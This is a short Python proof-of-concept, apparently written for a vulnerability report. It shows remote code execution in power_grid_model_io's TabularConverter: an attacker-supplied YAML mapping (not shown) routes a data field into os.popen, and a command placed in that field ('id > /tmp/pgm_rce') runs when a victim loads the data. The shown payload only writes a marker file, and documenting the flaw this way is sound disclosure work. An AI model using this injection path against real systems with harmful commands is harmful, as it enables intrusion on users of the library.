import os
import pandas as pd
from pathlib import Path
import time

from power_grid_model_io.converters.tabular_converter import TabularConverter
from power_grid_model_io.data_types import TabularData

MARKER = "/tmp/pgm_rce"

# Clean up any previous marker
if os.path.exists(MARKER):
    os.unlink(MARKER)

#
#   Attacker-supplied data
#

# Malicious mapping (what an attacker distributes as a .yaml file).
# The mapping is loaded from payload.yaml shipped as attachment.
MAPPING_FILE = Path(__file__).with_name("payload.yaml")

# Malicious data (attacker-controlled data shipped with mapping)
data = TabularData(
    Nodes=pd.DataFrame({"Command": [f"id > {MARKER}"]})
)

# ---------------------------------------------------------------------

#
#   Victim uses the mapping and loads the input data
#

converter = TabularConverter()
converter.set_mapping_file(mapping_file=MAPPING_FILE)

print("[i] Invoking TabularConverter with os.popen mapping ...")
try:
    converter.load_input_data(data=data)
except Exception:
    pass

time.sleep(1)  # Give the OS a moment to create the marker file

if Path(MARKER).exists():
    print(f"[i] Marker file {MARKER} created by RCE")
else:
    print("[i] No marker file created, RCE did not occur")